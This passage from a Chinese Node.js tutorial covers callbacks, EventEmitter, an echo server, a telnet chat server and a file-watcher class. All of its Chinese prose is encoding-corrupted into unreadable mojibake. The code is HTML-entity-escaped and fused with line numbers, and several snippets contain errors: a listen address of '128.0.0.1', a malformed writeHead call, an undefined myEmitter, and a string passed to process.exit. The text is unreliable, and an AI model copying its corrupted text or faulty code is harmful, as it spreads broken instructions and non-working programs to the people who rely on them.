getTemplateè¯»å–æ¨¡å—æ–‡ä»¶ï¼Œå¹¶å°†æŽ§åˆ¶æƒè½¬äº¤ç»™ formatHtmlfunction getTemplate(titles, res) &#123; fs.readFile('./template.html', (err, data) =&gt; &#123; if (err) &#123; hadError(err, res); &#125; else &#123; formatHtml(titles, data.toString(), res); &#125; &#125;);&#125;// formatHtml å¾—åˆ°æ ‡é¢˜å’Œæ¨¡æ¿ï¼Œæ¸²æŸ“ä¸€ä¸ªå“åº”ç»™å®¢æˆ·ç«¯function formatHtml(titles, tmpl, res) &#123; const html = tmpl.replace('%', titles.join('&lt;li&gt;&lt;/li&gt;')); res.writeHead('Content-Type', 'text/html'); res.end(html);&#125;// é”™è¯¯å¤„ç†ï¼Œå¦‚æžœè¿‡ç¨‹ä¸­å‡ºé”™ï¼ŒæŽ§åˆ¶å°ä¼šè¾“å‡ºé”™è¯¯ï¼Œå¹¶æƒ³å®¢æˆ·ç«¯è¿”å›ž Server Errorfunction hadError(err, res) &#123; console.log(err); res.end('Server Error');&#125; è¿˜å¯ä»¥ç”¨ Node å¼€å‘ä¸­çš„å¦ä¸€ç§æƒ¯ç”¨æ³•æ¥å‡å°‘ç”± if/else å¼•èµ·çš„åµŒå¥—ï¼Œå°½æ—©ä»Žå‡½æ•°ä¸­è¿”å›žã€‚ é€šè¿‡å°½å¿«è¿”å›žå‡å°‘åµŒå¥—çš„ä¾‹å­ï¼š 12345678910111213141516171819202122232425262728293031const http = require('http');const fs = require('fs');http.createServer((req, res) =&gt; &#123; getTitles(res);&#125;).listen(8000, '128.0.0.1');function getTitles(res) &#123; fs.readFile('./titles.json', (err, data) =&gt; &#123; if (err) return hadError(err, res); getTemplate(JSON.parse(data.toString()), res); &#125;);&#125;function getTemplate(titles, res) &#123; fs.readFile('./template.html', (err, data) =&gt; &#123; if (err) return hadError(err, res) formatHtml(titles, data.toString(), res); &#125;);&#125;function formatHtml(titles, tmpl, res) &#123; const html = tmpl.replace('%', titles.join('&lt;li&gt;&lt;/li&gt;')); res.writeHead(200, &#123; 'Content-Type': 'text/html' &#125;); res.end(html);&#125;function hadError(err, res) &#123; console.log(err); res.end('Server Error');&#125; æˆ‘ä»¬å·²ç»çŸ¥é“å¦‚ä½•ä½¿ç”¨ä¸€æ¬¡æ€§ä»»åŠ¡å®šä¹‰å“åº”äº†ã€‚ä¸Šé¢çš„è¯»å–æ–‡ä»¶å’Œå“åº” Web æœåŠ¡å™¨è¯·æ±‚ã€‚ Node çš„å¼‚æ­¥å›žè°ƒæƒ¯ä¾‹ Node ä¸­çš„å¤§å¤šæ•°å†…ç½®æ¨¡å—åœ¨ä½¿ç”¨å›žè°ƒæ—¶éƒ½ä¼šå¸¦ä¸¤ä¸ªå‚æ•°ï¼Œç¬¬ä¸€ä¸ªç”¨æ¥æ”¾å¯èƒ½ä¼šå‘ç”Ÿçš„é”™è¯¯ï¼Œç¬¬äºŒä¸ªç”¨æ¥æ”¾ç»“æžœã€‚é”™è¯¯å‚æ•°ç»å¸¸ç¼©å†™ä¸º errã€‚ ç”¨äº‹ä»¶å‘å°„å™¨å¤„ç†é‡å¤æ€§äº‹ä»¶äº‹ä»¶å¤„ç†å™¨ä¼šè§¦å‘äº‹ä»¶ï¼Œå¹¶ä¸”åœ¨é‚£äº›äº‹ä»¶è¢«è§¦å‘æ—¶èƒ½å¤„ç†å®ƒä»¬ï¼Œä¸€äº›é‡è¦çš„Node Api ç»„ä»¶ï¼Œæ¯”å¦‚ HTTP æœåŠ¡å™¨ã€TCP æœåŠ¡å™¨å’Œæµï¼Œéƒ½è¢«åšæˆäº†äº‹ä»¶å‘å°„å™¨ã€‚æˆ‘ä»¬ä¹Ÿå¯ä»¥åˆ›å»ºè‡ªå·±çš„äº‹ä»¶å‘å°„å™¨ã€‚ äº‹ä»¶æ˜¯é€šè¿‡ç›‘å¬å™¨è¿›è¡Œå¤„ç†çš„ã€‚ç›‘å¬å™¨æ˜¯è·Ÿäº‹ä»¶ç›¸å…³è”çš„ã€å½“æœ‰äº‹ä»¶å‡ºçŽ°æ—¶å°±ä¼šè§¦å‘çš„å›žè°ƒå‡½æ•°ã€‚æ¯”å¦‚ Node ä¸­çš„ TCP socket ï¼Œå®ƒæœ‰ä¸€ä¸ª data äº‹ä»¶ï¼Œæ¯å½“ socket ä¸­æœ‰æ–°æ•°æ®æ—¶å°±ä¼šè§¦å‘ï¼š 1socket.on('data', handleData); äº‹ä»¶å‘å°„å™¨ç¤ºä¾‹echo æœåŠ¡å™¨å°±æ˜¯ä¸€ä¸ªå¤„ç†é‡å¤æ€§äº‹ä»¶çš„ç®€å•ä¾‹å­ï¼Œå½“ä½ ç»™å®ƒå‘é€æ•°æ®æ—¶ï¼Œå®ƒä¼šæŠŠæ•°æ®å‘å›žæ¥ã€‚ å®žçŽ°ä¸€ä¸ª echo æœåŠ¡å™¨ï¼Œå½“æœ‰å®¢æˆ·ç«¯è¿žæŽ¥ä¸Šæ¥æ—¶ï¼Œå®ƒå°±ä¼šåˆ›å»ºä¸€ä¸ª socket ã€‚socket æ˜¯ä¸€ä¸ªäº‹ä»¶å‘å°„å™¨ï¼Œå¯ä»¥ç”¨ on æ–¹æ³•æ·»åŠ ç›‘å¬å™¨å“åº” data äº‹ä»¶ã€‚åªè¦ socket ä¸Šæœ‰æ–°æ•°æ®è¿‡æ¥ï¼Œå°±ä¼šå‘è¿™äº› data äº‹ä»¶ã€‚ 123456789const net = require('net');const server = net.createServer(socket =&gt; &#123; // å½“è¯»å–åˆ°æ–°æ•°æ®æ—¶å¤„ç†çš„ data äº‹ä»¶ socket.on('data', data =&gt; &#123; // æ•°æ®è¢«å†™å›žåˆ°å®¢æˆ·ç«¯ socket.write(data); &#125;);&#125;);server.listen(8888); ç”¨ä¸‹é¢çš„å‘½ä»¤è¿è¡Œ echo æœåŠ¡å™¨ï¼š 1node echo_server.js echo æœåŠ¡å™¨è¿è¡Œèµ·æ¥ä¹‹åŽï¼Œå°±å¯ä»¥ç”¨ä¸‹é¢çš„å‘½ä»¤è¿žä¸ŠåŽ»(å¯ä»¥å¦å¼€ä¸€ä¸ªç»ˆç«¯)ï¼š 1telnet 127.0.0.1 8888 æ¯æ¬¡é€šè¿‡ telnet ä¼šè¯æŠŠæ•°æ®å‘é€ç»™æœåŠ¡å™¨ï¼Œæ•°æ®éƒ½ä¼šå›žä¼ åˆ° telnetä¼šè¯ä¸­ï¼Œæ„å‘³ç€ä½ æ¯æ‰“ä¸€ä¸ªå­—æ¯ï¼Œå®ƒä¹Ÿä¼šè¿”å›žå¯¹åº”çš„å­—æ¯ã€‚ window çš„ telnet æ˜¯é»˜è®¤ä¸å¼€å¯çš„ã€‚å…·ä½“æ€Žä¹ˆå¼€å¯å¯ä»¥çœ‹è¿™é‡Œã€‚ å“åº”åªåº”è¯¥å‘ç”Ÿä¸€æ¬¡çš„äº‹ä»¶ç›‘å¬å™¨å¯ä»¥è¢«å®šä¹‰æˆæŒç»­ä¸æ–­è¢«åœ°å“åº”äº‹ä»¶ï¼Œå¦‚å‰é¢çš„ä¾‹å­ï¼Œä¹Ÿèƒ½è¢«å®šä¹‰æˆåªå“åº”ä¸€æ¬¡ï¼Œä¸‹é¢çš„ä»£ç ç”¨äº† once æ–¹æ³•ï¼Œå¯¹å‰é¢çš„é‚£ä¸ª echo æœåŠ¡å™¨åšäº†ä¿®æ”¹ï¼Œè®©å®ƒåªå›žåº”ç¬¬ä¸€æ¬¡å‘é€è¿‡æ¥çš„æ•°æ®ã€‚ 1234567const net = require('net');const server = net.createServer(socket =&gt; &#123; socket.once('data', data =&gt; &#123; socket.write(data); &#125;);&#125;);server.listen(8888); åˆ›å»ºäº‹ä»¶å‘å°„å™¨ï¼šä¸€ä¸ª PUB/SUB çš„ä¾‹å­å‰é¢çš„ä¾‹å­ç”¨äº†ä¸€ä¸ªå¸¦äº‹ä»¶å‘å°„å™¨çš„ Node å†…ç½® APIã€‚ç„¶åŽæˆ‘ä»¬å¯ä»¥ç”¨ Node å†…ç½®çš„äº‹ä»¶æ¨¡å—åˆ›å»ºè‡ªå·±çš„äº‹ä»¶å‘å°„å™¨ã€‚ ä¸‹é¢ä»£ç å®šä¹‰äº†ä¸€ä¸ª channel äº‹ä»¶å‘å°„å™¨ï¼Œå¸¦æœ‰ä¸€ä¸ªç›‘å¬å™¨ï¼Œå¯ä»¥å‘åŠ å…¥é¢‘é“çš„äººåšå‡ºç›¸åº”ã€‚æ³¨æ„è¿™é‡Œç”¨ on (æˆ–è€…ç”¨è¾ƒé•¿çš„ addListener)æ–¹æ³•ç»™äº‹ä»¶å‘å°„å™¨æ·»åŠ äº†ç›‘å¬å™¨ï¼š 1234567const EventEmitter = require('events').EventEmitter;const channel = new EventEmitter();channel.on('join',() =&gt;&#123; console.log('Welcome');&#125;);// ç”¨ emit å‡½æ•°å‘å°„è¿™ä¸ªäº‹ä»¶ï¼Œå¦åˆ™æ°¸è¿œä¸ä¼šå›žè°ƒchannel.emit('join'); äº‹ä»¶åç§°ï¼šäº‹ä»¶æ˜¯å¯ä»¥å…·æœ‰ä»»æ„å­—ç¬¦ä¸²å€¼çš„é”®ï¼šdataã€joinæˆ–æŸäº›é•¿çš„è®©äººå‘ç–¯çš„äº‹ä»¶åéƒ½è¡Œã€‚åªæœ‰ä¸€ä¸ªäº‹ä»¶æ˜¯ç‰¹æ®Šçš„ï¼Œé‚£å°±æ˜¯ error ã€‚ æŽ¥ç€ç”¨ EventEmitter å®žçŽ°è‡ªå·±çš„å‘å¸ƒ/é¢„å®šé€»è¾‘ï¼Œåšä¸€ä¸ªé€šä¿¡é€šé“ã€‚å¦‚æžœè¿è¡Œäº†ä¸‹é¢çš„ä»£ç ï¼Œå°±ä¼šå¾—åˆ°ä¸€ä¸ªç®€å•çš„èŠå¤©æœåŠ¡å™¨ã€‚èŠå¤©æœåŠ¡å™¨çš„é¢‘é“è¢«åšæˆäº†äº‹ä»¶å‘å°„å™¨ï¼Œèƒ½å¯¹å®¢æˆ·ç«¯å‘å‡ºçš„ join äº‹ä»¶åšæˆå“åº”ã€‚å½“æœ‰å®¢æˆ·ç«¯åŠ å…¥èŠå¤©é¢‘é“æ—¶ï¼Œjoin ç›‘å¬å™¨é€»è¾‘ä¼šå°†ä¸€ä¸ªé’ˆå¯¹è¯¥å®¢æˆ·ç«¯çš„ç›‘å¬å™¨é™„åŠ åˆ°é¢‘é“ä¸Šï¼Œç”¨æ¥å¤„ç†ä¼šå°†æ‰€æœ‰å¹¿æ’­æ¶ˆæ¯å†™å…¥æ”¹å®¢æˆ·ç«¯ socket çš„ broadcast äº‹ä»¶ã€‚äº‹ä»¶ç±»åž‹çš„åç§°,æ¯”å¦‚ join å’Œ broadcast ï¼Œå®Œå…¨æ˜¯éšæ„å–çš„ã€‚ä½ å¯ä»¥æŒ‰è‡ªå·±çš„å–œå¥½ç»™å®ƒä»¬æ¢ä¸ªåå­—ã€‚ ç”¨äº‹ä»¶å‘å°„å™¨å®žçŽ°ç®€å•çš„å‘å¸ƒ/é¢„å®šç³»ç»Ÿ 12345678910111213141516171819202122232425262728const events = require('events');const net = require('net');const channel = new events.EventEmitter();channel.clients = &#123;&#125;;channel.subscriptions = &#123;&#125;;channel.on('join',function(id,client)&#123; // æ·»åŠ  join äº‹ä»¶çš„ç›‘å¬å™¨ï¼Œä¿å­˜ç”¨æˆ·çš„ client å¯¹è±¡ï¼Œä»¥ä¾¿ç¨‹åºå¯ä»¥å°†æ•°æ®å‘é€ç»™ç”¨æˆ· this.clients[id] = client; this.subscriptions[id] = (senderId,message) =&gt;&#123; if(id != senderId)&#123; this.clients[id].write(message); &#125; &#125; // æ·»åŠ ä¸€ä¸ªä¸“é—¨é’ˆå¯¹å½“å‰ç”¨æˆ·çš„ broadcast äº‹ä»¶ç›‘å¬å™¨ this.on('broadcast',this.subscriptions[id]);&#125;);const server = net.createServer(client =&gt;&#123; const id = `$&#123;client.remoteAddress&#125;:$&#123;client.remotePort&#125;`; // å½“æœ‰ç”¨æˆ·è¿žæŽ¥åˆ°æœåŠ¡å™¨ä¸Šæ—¶å‘å‡ºä¸€ä¸ª jion äº‹ä»¶ï¼ŒæŒ‡æ˜Žç”¨æˆ· ID å’Œ client å¯¹è±¡ channel.emit('join',id,client); client.on('data',data =&gt;&#123; data = data.toString(); // å½“æœ‰ç”¨æˆ·å‘é€æ•°æ®æ—¶ï¼Œå‘å‡ºä¸€ä¸ªé¢‘é“ broadcast äº‹ä»¶ï¼ŒæŒ‡æ˜Žç”¨æˆ· ID å’Œ æ¶ˆæ¯ channel.emit('broadcast',id,data); &#125;);&#125;);server.listen(8888); æŠŠèŠå¤©æœåŠ¡å™¨è·‘èµ·æ¥åŽï¼Œæ‰“å¼€ä¸¤ä¸ªæ–°çš„å‘½ä»¤è¡Œçª—å£ï¼Œå¹¶åœ¨ä¸¤ä¸ªéƒ½è¾“å…¥ä¸‹é¢çš„å‘½ä»¤è¿›å…¥èŠå¤©ç¨‹åºï¼š 1telnet 127.0.0.1 8888 åœ¨å…¶ä¸­ä»»ä½•ä¸€ä¸ªçª—å£è¾“å…¥çš„å†…å®¹éƒ½ä¼šè¢«å‘é€åˆ°å…¶ä»–æ‰€æœ‰çª—å£ä¸­ã€‚ è¿™ä¸ªèŠå¤©æœåŠ¡å™¨è¿˜æœ‰ä¸€ä¸ªé—®é¢˜ï¼Œåœ¨ç”¨æˆ·å…³é—­è¿žæŽ¥ç¦»å¼€èŠå¤©å®¤åŽï¼ŒåŽŸæ¥çš„é‚£ä¸ªç›‘å¬å™¨è¿˜åœ¨ï¼Œä»ä¼šå°è¯•å‘å·²ç»æ–­å¼€è¿žæŽ¥å†™æ•°æ®ã€‚è¿™æ ·è‡ªç„¶å°±ä¼šå‡ºé”™ã€‚ä¸ºäº†è§£å†³è¿™æ ·çš„é—®é¢˜ï¼Œè¿˜è¦æŒ‰ç…§ä¸‹é¢çš„ä»£ç æ¸…å•æŠŠç›‘å¬å™¨åŠ åˆ°é¢‘é“äº‹ä»¶å‘å°„å™¨ä¸Šï¼Œå¹¶ä¸”å‘æœåŠ¡å™¨çš„ close äº‹ä»¶ç›‘å¬å™¨ä¸­æ·»åŠ å‘å°„é¢‘é“çš„ leave äº‹ä»¶çš„å¤„ç†é€»è¾‘ã€‚leave äº‹ä»¶æœ¬è´¨ä¸Šå°±æ˜¯è¦ç§»é™¤åŽŸæ¥ç»™å®¢æˆ·ç«¯æ·»åŠ çš„ broadcast ç›‘å¬å™¨ã€‚ åˆ›å»ºä¸€ä¸ªåœ¨ç”¨æˆ·æ–­å¼€è¿žæŽ¥æ—¶èƒ½ â€œæ‰“æ‰«æˆ˜åœºâ€çš„ç›‘å¬å™¨ 123456789101112131415161718192021222324252627282930313233343536373839const events = require('events');const net = require('net');const channel = new events.EventEmitter();channel.clients = &#123;&#125;;channel.subscriptions = &#123;&#125;;channel.on('join',function(id,client)&#123; // æ·»åŠ  join äº‹ä»¶çš„ç›‘å¬å™¨ï¼Œä¿å­˜ç”¨æˆ·çš„ client å¯¹è±¡ï¼Œä»¥ä¾¿ç¨‹åºå¯ä»¥å°†æ•°æ®å‘é€ç»™ç”¨æˆ· this.clients[id] = client; this.subscriptions[id] = (senderId,message) =&gt;&#123; if(id != senderId)&#123; this.clients[id].write(message); &#125; &#125; // æ·»åŠ ä¸€ä¸ªä¸“é—¨é’ˆå¯¹å½“å‰ç”¨æˆ·çš„ broadcast äº‹ä»¶ç›‘å¬å™¨ this.on('broadcast',this.subscriptions[id]);&#125;);// åˆ›å»ºleave äº‹ä»¶çš„ç›‘å¬å™¨channel.on('leave',function(id)&#123; channel.removeListener('broadcast',this.subscriptions[id]); // ç§»é™¤æŒ‡å®šå®¢æˆ·ç«¯çš„broadcast ç›‘å¬å™¨ channel.emit('broadcast',id,`$&#123;id&#125; has left the chatroom. \n`);&#125;);const server = net.createServer(client =&gt;&#123; const id = `$&#123;client.remoteAddress&#125;:$&#123;client.remotePort&#125;`; // å½“æœ‰ç”¨æˆ·è¿žæŽ¥åˆ°æœåŠ¡å™¨ä¸Šæ—¶å‘å‡ºä¸€ä¸ª jion äº‹ä»¶ï¼ŒæŒ‡æ˜Žç”¨æˆ· ID å’Œ client å¯¹è±¡ channel.emit('join',id,client); client.on('data',data =&gt;&#123; data = data.toString(); // å½“æœ‰ç”¨æˆ·å‘é€æ•°æ®æ—¶ï¼Œå‘å‡ºä¸€ä¸ªé¢‘é“ broadcast äº‹ä»¶ï¼ŒæŒ‡æ˜Žç”¨æˆ· ID å’Œ æ¶ˆæ¯ channel.emit('broadcast',id,data); &#125;); // åœ¨ç”¨æˆ·æ–­å¼€è¿žæŽ¥æ˜¯å‘å‡º leave äº‹ä»¶ client.on('close',() =&gt;&#123; channel.emit('leave',id); &#125;);&#125;);server.listen(8888); å¦‚æžœä½ æƒ³åœæ­¢æä¾›èŠå¤©æœåŠ¡ï¼Œä½†æ˜¯åˆä¸æƒ³å…³æŽ‰æœåŠ¡å™¨çš„ï¼Œå¯ä»¥ç”¨ removeAll-Listeners äº‹ä»¶å‘å°„å™¨æ–¹æ³•åŽ»æŽ‰ç»™å®šç±»åž‹çš„å…¨éƒ¨ç›‘å¬å™¨ã€‚ 1234channel.on('shutdown',() =&gt;&#123; channel.emit('broadcast','','The Server has shut down.\n'); channel.removeAllListeners('broadcast');&#125;); ç„¶åŽä½ å¯ä»¥æ·»åŠ ä¸€ä¸ªåœæ­¢æœåŠ¡çš„èŠå¤©å‘½ä»¤ã€‚ä¸ºæ­¤éœ€è¦å°† data äº‹ä»¶çš„ç›‘å¬å™¨æ”¹æˆä¸‹é¢è¿™æ ·ï¼š 12345678client.on('data',data =&gt;&#123; data = data.toString(); if(data === 'shutdown\r\n')&#123; channel.emit('shutdown'); &#125; // å½“æœ‰ç”¨æˆ·å‘é€æ•°æ®æ—¶ï¼Œå‘å‡ºä¸€ä¸ªé¢‘é“ broadcast äº‹ä»¶ï¼ŒæŒ‡æ˜Žç”¨æˆ· ID å’Œ æ¶ˆæ¯ channel.emit('broadcast',id,data);&#125;); çŽ°åœ¨åªè¦æœ‰äººè¾“å…¥ shutdown å‘½ä»¤ï¼Œæ‰€æœ‰å‚ä¸ŽèŠå¤©çš„äººéƒ½ä¼šè¢«è¸¢å‡ºåŽ»ã€‚ é”™è¯¯å¤„ç† åœ¨é”™è¯¯å¤„ç†ä¸Šæœ‰ä¸€ä¸ªå¸¸è§„åšæ³•ï¼Œä½ å¯ä»¥åˆ›å»ºå‘å‡º error ç±»åž‹äº‹ä»¶çš„äº‹ä»¶å‘å°„å™¨ï¼Œè€Œä¸æ˜¯ç›´æŽ¥æŠ›å‡ºé”™è¯¯ï¼Œè¿™æ ·å°±å¯ä»¥ä¸ºè¿™äº‹ä»¶ç±»åž‹è®¾ç½®ä¸€ä¸ªæˆ–è€…å¤šä¸ªç›‘å¬å™¨ï¼Œä»Žè€Œå®šåˆ¶çš„äº‹ä»¶å“åº”é€»è¾‘ã€‚ ä¸‹é¢çš„ä»£ç æ˜¾ç¤ºçš„æ˜¯ä¸€ä¸ªé”™è¯¯ç›‘å¬å™¨å¦‚ä½•å°†å‘å‡ºçš„é”™è¯¯è¾“å‡ºåˆ°æŽ§åˆ¶å°ä¸­ï¼š 123456const events = require('events');events.myEmitter = new events.EventEmitter();myEmitter.on('error',err =&gt;&#123; console.log(`ERROR: $&#123;err.message&#125;`); &#125;);myEmitter.emit('error', new Error('something is wrong')); å¦‚æžœå‘å‡ºè¿™ä¸ª error äº‹ä»¶æµç±»åž‹æ²¡æœ‰è¯¥äº‹ä»¶ç±»åž‹çš„ç›‘å¬å™¨ï¼Œäº‹ä»¶ç›‘å¬å™¨ä¼šè¾“å‡ºä¸€ä¸ªæ ˆè·Ÿè¸ªï¼ˆåˆ°é”™è¯¯å‘ç”Ÿæ—¶æ‰€æ‰§è¡Œçš„ç¨‹åºæŒ‡ä»¤åˆ—è¡¨ï¼‰å¹¶åœæ­¢æ‰§è¡Œã€‚æ ˆè·Ÿè¸ªä¼šç”¨ emit è°ƒç”¨çš„ç¬¬äºŒä¸ªå‚æ•°æŒ‡æ˜Žé”™è¯¯ç±»åž‹ã€‚è¿™æ˜¯åªæœ‰é”™è¯¯ç±»åž‹äº‹ä»¶æ‰èƒ½äº«å—çš„ç‰¹æ®Šå¾…é‡ï¼Œåœ¨å‘å‡ºæ²¡æœ‰ç›‘å¬å™¨çš„å…¶ä»–äº‹ä»¶ç±»åž‹æ—¶ï¼Œä»€ä¹ˆä¹Ÿä¸ä¼šå‘ç”Ÿã€‚ å¦‚æžœå‘å‡ºçš„ error ç±»åž‹äº‹ä»¶æ²¡æœ‰ä½œä¸ºç¬¬äºŒä¸ªå‚æ•°çš„ error å¯¹è±¡ï¼Œæ ˆè·Ÿè¸ªä¼šæŒ‡å‡ºä¸€ä¸ª â€ä¸ºæ•èŽ·ã€æœªæŒ‡æ˜Žçš„â€˜é”™è¯¯â€™äº‹ä»¶â€œé”™è¯¯ï¼Œå¹¶ä¸”ç¨‹åºä¼šåœæ­¢æ‰§è¡Œã€‚å¯ä»¥ç”¨ä¸€ä¸ªå·²ç»åºŸé™¤çš„æ–¹æ³•æ¥å¤„ç†è¿™ä¸ªé”™è¯¯ï¼Œç”¨ä¸‹é¢çš„ä»£ç é¡¶ä¸€ä¸ªå…¨å±€çš„å¤„ç†å™¨å®žçŽ°å“åº”é€»è¾‘ 1234process.on('uncaughtException',err =&gt;&#123; console.log(err.stack); process.exit('1');&#125;); è®©è¿žæŽ¥ä¸Šé¢çš„ç”¨æˆ·çœ‹åˆ°å½“å‰æœ‰å‡ ä¸ªå·²é“¾æŽ¥çš„èŠå¤©å¯¹è±¡ï¼Œå¯ä»¥ç”¨ä¸‹é¢è¿™ä¸ªç›‘å¬å™¨æ–¹æ³•ï¼Œå®ƒèƒ½æ ¹æ®ç»™å®šçš„äº‹ä»¶ç±»åž‹è¿”å›žä¸€ä¸ªç›‘å¬å™¨æ•°ç»„ï¼š 12345678910111213141516channel.on('join', function (id, client) &#123; //æŸ¥çœ‹åŠ å…¥èŠå¤©å®¤çš„äººæ•° const welcome = ` Welcome! Guset online: $&#123;this.listeners('broadcast').length&#125;`; client.write(`$&#123;welcome&#125;\n`); // æ·»åŠ  join äº‹ä»¶çš„ç›‘å¬å™¨ï¼Œä¿å­˜ç”¨æˆ·çš„ client å¯¹è±¡ï¼Œä»¥ä¾¿ç¨‹åºå¯ä»¥å°†æ•°æ®å‘é€ç»™ç”¨æˆ· this.clients[id] = client; this.subscriptions[id] = (senderId, message) =&gt; &#123; if (id != senderId) &#123; this.clients[id].write(message); &#125; &#125; // æ·»åŠ ä¸€ä¸ªä¸“é—¨é’ˆå¯¹å½“å‰ç”¨æˆ·çš„ broadcast äº‹ä»¶ç›‘å¬å™¨ this.on('broadcast', this.subscriptions[id]);&#125;); ä¸ºäº†å¢žåŠ èƒ½å¤Ÿé™„åŠ åˆ°äº‹ä»¶å‘å°„å™¨ä¸Šçš„ç›‘å¬å™¨æ•°é‡ï¼Œä¸è®©Node åœ¨ç›‘å¬å™¨æ•°é‡è¶…è¿‡ 10ä¸ªæ—¶å‘å‡ºè­¦å‘Šï¼Œå¯ä»¥ç”¨ setMaxListeners æ–¹æ³•ã€‚ä»¥è¯¥é¢‘é“äº‹ä»¶å‘å°„å™¨ä¸ºä¾‹ï¼Œå¯ä»¥ç”¨ä¸‹é¢çš„ä»£ç å¢žåŠ ç›‘å¬å™¨çš„æ•°é‡ï¼š 1channel.setMaxListeners(50); æ‰©å±•äº‹ä»¶ç›‘å¬å™¨ï¼šæ–‡ä»¶ç›‘å¬å™¨å¦‚æžœä½ æƒ³åœ¨äº‹ä»¶å‘å°„å™¨çš„åŸºç¡€ä¸Šæž„é€ ç¨‹åºï¼Œå¯ä»¥åˆ›å»ºä¸€ä¸ªæ–°çš„ javaScript ç±»ç»§æ‰¿äº‹ä»¶å‘å°„å™¨ã€‚ æ¯”å¦‚åˆ›å»ºä¸€ä¸ª watcher ç±»æ¥å¤„ç†æ”¾åœ¨æŸä¸ªç›®å½•ä¸‹çš„æ–‡ä»¶ï¼Œç„¶åŽå¯ä»¥ç”¨è¿™ä¸ªç±»åˆ›å»ºä¸€ä¸ªå·¥å…·ï¼Œè¯¥å·¥å…·å¯ä»¥ç›‘è§†ç›®å½•ï¼ˆå°†æ”¾åœ¨é‡Œé¢çš„æ–‡ä»¶åéƒ½æ”¹ä¸ºå°å†™ï¼Œå¹¶å°†æ–‡ä»¶å¤åˆ¶åˆ°ä¸€ä¸ªå•ç‹¬ç›®å½•ä¸­ï¼‰ è®¾ç½®å¥½ Watcher å¯¹è±¡åŽï¼Œè¿˜éœ€è¦åŠ ä¸¤ä¸ªæ–°æ–¹æ³•æ¥æ‰©å±•ç»§æ‰¿è‡ª EventEmitter çš„æ–¹æ³•ï¼Œä»£ç å¦‚ä¸‹ï¼š 123456789101112131415161718192021222324252627const fs = require('fs');const events = require('events');// æ‰©å±• EventEmitter æ·»åŠ å¤„ç†æ–‡ä»¶çš„æ–¹æ³•class Watcher extends events.EventEmitter &#123; constructor(watchDir, processedDir)&#123; super(); this.watchDir = watchDir; this.processedDir = processedDir; &#125; // å¤„ç† watch ç›®å½•ä¸­çš„æ‰€æœ‰æ–‡ä»¶ watch()&#123; fs.readdir(this.watchDir, (err, files) =&gt;&#123; if(err) throw err; for(var index in files)&#123; this.emit('process',files[index]); &#125; &#125;); &#125; // æ·»åŠ å¼€å§‹ç›‘æŽ§çš„æ–¹æ³• start()&#123; fs.watchFile(this.watchDir, ()=&gt;&#123; this.watch(); &#125;); &#125;&#125;module.exports = Watcher; watch æ–¹æ³•å¾ªçŽ¯ç›®å½•ï¼Œå¤„ç†å…¶ä¸­çš„æ‰€æœ‰æ–‡ä»¶ã€‚start æ–¹æ³•å¯åŠ¨å¯¹ç›®å½•çš„ç›‘æŽ§ã€‚ç›‘æŽ§ç”¨åˆ°äº† Node çš„ fs.watchFile å‡½æ•°ï¼Œæ‰€ä»¥å½“è¢«ç›‘æŽ§çš„ç›®å½•ä¸­æœ‰äº‹æƒ…å‘ç”Ÿçš„æ—¶å€™ï¼Œwatchæ–¹æ³•å°±ä¼šè§¦å‘ï¼Œå¾ªçŽ¯éåŽ†æ•´ä¸ªå—ç›‘æŽ§çš„ç›®å½•ï¼Œå¯ä»¥ç”¨ä¸€ä¸‹ä»£ç åˆ›å»ºä¸€ä¸ª Watcher å¯¹è±¡ï¼š 1const watcher = new Watcher(watchDir,processedDir); æ³¨æ„ï¼ŒwatchDirä¸ºè§‚å¯Ÿçš„æ–‡ä»¶åï¼Œ processedDirä¸ºæ–‡ä»¶è¿›ç¨‹å¤„ç†åŽè¦æ”¾ç½®çš„æ–‡ä»¶å æœ‰äº†æ–°åˆ›å»ºçš„ Watcher å¯¹è±¡ï¼Œå°±å¯ä»¥ç»§æ‰¿è‡ªäº‹ä»¶å‘å°„å™¨ç±»çš„ on æ–¹æ³•è®¾å®šæ¯ä¸ªæ–‡ä»¶çš„å¤„ç†é€»è¾‘ï¼Œå¦‚ä¸‹æ‰€ç¤ºï¼š 12345678910watcher.on('process',(file) =&gt;&#123; // ç›®æ ‡æ–‡ä»¶è·¯å¾„ const watchFile = `$&#123;watchDir&#125;/$&#123;file&#125;`; // å¤„ç†ä¹‹åŽæ–‡ä»¶çš„å°å†™è·¯å¾„ const processedFile = `$&#123;processedDir&#125;/$&#123;file.toLowerCase()&#125;`; // é‡å‘½åæ–‡ä»¶ fs.rename(watchFile,processedFile,err =&gt;&#123; if(err) throw err; &#125;);&#125;); æŽ¥ç€å°±å¯ä»¥å¯åŠ¨å¯¹ç›®å½•çš„ç›‘æŽ§ï¼š 1watcher.start(); æ–°å»º watch å’Œ done ç›®å½•ï¼Œç„¶åŽè¾“å…¥ç›®æ ‡æ–‡ä»¶åå’Œå®Œæˆä¹‹åŽçš„æ–‡ä»¶å: 12const watchDir = 'watch';const processedDir = 'done'; è¿è¡Œä½ æ‰€å‘½åçš„æ–‡ä»¶å: 1node Extended_Emitter.js æŽ¥ç€æŠŠæ–‡ä»¶ä¸¢åˆ° watch ç›®å½•ä¸­ï¼Œç„¶åŽçœ‹ç€æ–‡ä»¶å‡ºçŽ°åœ¨ done ç›®å½•ä¸­ï¼Œæ–‡ä»¶åè¢«æ”¹æˆå°å†™ã€‚è¿™å°±æ˜¯ç”¨äº‹ä»¶å‘å°„å™¨åˆ›å»ºæ–°ç±»çš„ä¾‹å­ã€‚ å­¦ä¹ äº†ä½¿ç”¨å›žè°ƒå®šä¹‰ä¸€æ¬¡æ€§å¼‚æ­¥é€»è¾‘ï¼Œå·²ç»å¦‚ä½•ç”¨äº‹ä»¶å‘å°„å™¨é‡å¤æ´¾å‘å¼‚æ­¥é€»è¾‘ã€‚æˆ‘ä»¬å¯èƒ½è¿˜æƒ³åœ¨å•ä¸ªå›žè°ƒæˆ–äº‹ä»¶å‘å°„å™¨çš„ç›‘å¬å™¨ä¸­æ·»åŠ æ–°çš„å¼‚æ­¥ä»»åŠ¡ã€‚å¦‚æžœè¿™äº›ä»»åŠ¡çš„æ‰§è¡Œé¡ºåºå¾ˆé‡è¦ï¼Œå°±ä¼šé¢å¯¹æ–°çš„éš¾é¢˜:å¦‚ä½•å‡†ç¡®æŽ§åˆ¶ä¸€ç³»åˆ—å¼‚æ­¥ä»»åŠ¡é‡Œçš„æ¯ä¸ªä»»åŠ¡ã€‚ 